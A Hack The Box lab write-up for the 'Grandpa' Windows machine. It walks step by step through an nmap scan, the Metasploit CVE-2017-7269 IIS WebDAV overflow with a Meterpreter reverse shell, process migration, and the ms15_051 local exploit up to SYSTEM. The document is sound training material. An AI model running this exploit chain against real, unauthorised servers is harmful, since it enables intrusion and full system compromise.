# htb-grandpa
This is my [Hack the box](https://www.hackthebox.eu/)'s Grandpa write-up.

## Machine
OS: Windows

IP: 10.10.10.14

Difficulty: Easy

## Initial enumeration
[Nmap](https://github.com/nmap/nmap) scan on the target:

`nmap -sV -sC -oA grandpa $GRANDPA`

Flags:
 - `-sV`: Version detection
 - `-sC`: Script scan using the default set of scripts
 - `-oA`: Output in all file types

```
kali@kali:~/grandpa$ nmap -sC -sV -oA grandpa $GRANDPA
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 13:54 EDT
Nmap scan report for 10.10.10.14 (10.10.10.14)
Host is up (0.16s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   WebDAV type: Unknown
|   Server Date: Mon, 14 Sep 2020 18:01:09 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|_  Server Type: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.57 seconds
```

There is an outdated version of IIS running on the server. Also note the many available HTTP methods including PUT which may be interesting. The exploitation this time will be purely using Metasploit.

## Exploitation
### Search for IIS-related Metasploit modules
Let's search for modules that contain the keyword _iis_:
```
msf5 > search iis

Matching Modules
================

   #   Name                                                             Disclosure Date  Rank       Check  Description
   -   ----                                                             ---------------  ----       -----  -----------
   0   auxiliary/admin/appletv/appletv_display_video                                     normal     No     Apple TV Video Remote Control
   1   auxiliary/admin/http/iis_auth_bypass                             2010-07-02       normal     No     MS10-065 Microsoft IIS 5 NTFS Stream Authentication Bypass
   2   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof                     2010-12-21       normal     No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   3   auxiliary/dos/windows/ftp/iis_list_exhaustion                    2009-09-03       normal     No     Microsoft IIS FTP Server LIST Stack Exhaustion
   4   auxiliary/dos/windows/http/ms10_065_ii6_asp_dos                  2010-09-14       normal     No     Microsoft IIS 6.0 ASP Stack Exhaustion Denial of Service
   5   auxiliary/scanner/http/dir_webdav_unicode_bypass                                  normal     No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
   6   auxiliary/scanner/http/iis_internal_ip                                            normal     No     Microsoft IIS HTTP Internal IP Disclosure
   7   auxiliary/scanner/http/iis_shortname_scanner                                      normal     Yes    Microsoft IIS shortname vulnerability scanner
   8   auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                             normal     No     MS09-020 IIS6 WebDAV Unicode Authentication Bypass
   9   auxiliary/scanner/http/owa_iis_internal_ip                       2012-12-17       normal     No     Outlook Web App (OWA) / Client Access Server (CAS) IIS HTTP Internal IP Disclosure
   10  exploit/windows/firewall/blackice_pam_icq                        2004-03-18       great      No     ISS PAM.dll ICQ Parser Buffer Overflow
   11  exploit/windows/ftp/ms09_053_ftpd_nlst                           2009-08-31       great      No     MS09-053 Microsoft IIS FTP Server NLST Response Overflow
   12  exploit/windows/http/amlibweb_webquerydll_app                    2010-08-03       normal     Yes    Amlibweb NetOpacs webquery.dll Stack Buffer Overflow
   13  exploit/windows/http/ektron_xslt_exec_ws                         2015-02-05       excellent  Yes    Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution
   14  exploit/windows/http/umbraco_upload_aspx                         2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
   15  exploit/windows/iis/iis_webdav_scstoragepathfromurl              2017-03-26       manual     Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow
   16  exploit/windows/iis/iis_webdav_upload_asp                        2004-12-31       excellent  No     Microsoft IIS WebDAV Write Access Code Execution
   17  exploit/windows/iis/ms01_023_printer                             2001-05-01       good       Yes    MS01-023 Microsoft IIS 5.0 Printer Host Header Overflow
   18  exploit/windows/iis/ms01_026_dbldecode                           2001-05-15       excellent  Yes    MS01-026 Microsoft IIS/PWS CGI Filename Double Decode Command Execution
   19  exploit/windows/iis/ms01_033_idq                                 2001-06-18       good       No     MS01-033 Microsoft IIS 5.0 IDQ Path Overflow
   20  exploit/windows/iis/ms02_018_htr                                 2002-04-10       good       No     MS02-018 Microsoft IIS 4.0 .HTR Path Overflow
   21  exploit/windows/iis/ms02_065_msadc                               2002-11-20       normal     Yes    MS02-065 Microsoft IIS MDAC msadcs.dll RDS DataStub Content-Type Overflow
   22  exploit/windows/iis/ms03_007_ntdll_webdav                        2003-05-30       great      Yes    MS03-007 Microsoft IIS 5.0 WebDAV ntdll.dll Path Overflow
   23  exploit/windows/iis/msadc                                        1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   24  exploit/windows/isapi/ms00_094_pbserver                          2000-12-04       good       Yes    MS00-094 Microsoft IIS Phone Book Service Overflow
   25  exploit/windows/isapi/ms03_022_nsiislog_post                     2003-06-25       good       Yes    MS03-022 Microsoft IIS ISAPI nsiislog.dll ISAPI POST Overflow
   26  exploit/windows/isapi/ms03_051_fp30reg_chunked                   2003-11-11       good       Yes    MS03-051 Microsoft IIS ISAPI FrontPage fp30reg.dll Chunked Overflow
   27  exploit/windows/isapi/rsa_webagent_redirect                      2005-10-21       good       Yes    Microsoft IIS ISAPI RSA WebAgent Redirect Overflow
   28  exploit/windows/isapi/w3who_query                                2004-12-06       good       Yes    Microsoft IIS ISAPI w3who.dll Query String Overflow
   29  exploit/windows/scada/advantech_webaccess_dashboard_file_upload  2016-02-05       excellent  Yes    Advantech WebAccess Dashboard Viewer uploadImageCommon Arbitrary File Upload
   30  exploit/windows/ssl/ms04_011_pct                                 2004-04-13       average    No     MS04-011 Microsoft Private Communications Transport Overflow
```

### Select an exploit and set its options
This time the _Microsoft IIS WebDav ScStoragePathFromUrl Overflow_ exploit will be used (search result number 15 on the list), which is related to the [CVE-2017-7269](https://www.cvedetails.com/cve/CVE-2017-7269/) vulnerability and it is also known as "Exploding Can". Note that, when successful, the execution of this exploit leads to remote code execution.

Select exploit and show options for it:
```
msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl

msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.8       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86
```

Set RHOSTS, check and exploit:
```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
RHOSTS => 10.10.10.14

msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.10.10.14:80 - The target is vulnerable.

msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.8:4444 -> 10.10.10.14:1030) at 2020-09-20 12:49:01 -0400
```

The exploit worked and popped a shell. Get system info and user id:
```
meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

It is not possible to retrieve the user id, it may be a good idea to migrate the session to another process. List processes:
```
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 272   4     smss.exe                                                        
 324   272   csrss.exe                                                       
 348   272   winlogon.exe                                                    
 396   348   services.exe                                                    
 408   348   lsass.exe                                                       
 580   588   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 588   396   svchost.exe                                                     
 684   396   svchost.exe                                                     
 740   396   svchost.exe                                                     
 776   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1080  396   cisvc.exe                                                       
 1124  396   svchost.exe                                                     
 1184  396   inetinfo.exe                                                    
 1220  396   svchost.exe                                                     
 1272  348   logon.scr                                                       
 1332  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1460  396   svchost.exe                                                     
 1604  396   svchost.exe                                                     
 1704  396   alg.exe                                                         
 1812  588   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1916  396   dllhost.exe                                                     
 2112  2716  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 2264  588   wmiprvse.exe                                                    
 2716  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 3836  1080  cidaemon.exe                                                    
 3880  1080  cidaemon.exe                                                    
 3908  1080  cidaemon.exe
 ```
 
Let's try to migrate to the process with id 1812:
```
 meterpreter > migrate 1812
[*] Migrating from 2112 to 1812...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
```

Cool, now the user is `NT AUTHORITY\NETWORK SERVICE` and it will be possible to run a privilege escalation script.

Use the exploit suggester to check for privilege escalation modules:
```
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use post/multi/recon/local_exploit_suggester

msf5 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.14 - Collecting local exploits for x86/windows...
[*] 10.10.10.14 - 30 exploit checks are being tried...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

After trying with several ones, the exploit `windows/local/ms15_051_client_copy_image` worked:
```
msf5 exploit(windows/local/ms16_016_webdav) > use windows/local/ms15_051_client_copy_image
msf5 exploit(windows/local/ms15_051_client_copy_image) > set LHOST tun0
LHOST => tun0
msf5 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
SESSION => 1
msf5 exploit(windows/local/ms15_051_client_copy_image) > run

[*] Started reverse TCP handler on 10.10.14.8:4444 
[*] Launching notepad to host the exploit...
[+] Process 4028 launched.
[*] Reflectively injecting the exploit DLL into 4028...
[*] Injecting exploit into 4028...
[*] Exploit injected. Injecting payload into 4028...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.8:4444 -> 10.10.10.14:1040) at 2020-09-21 23:41:00 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
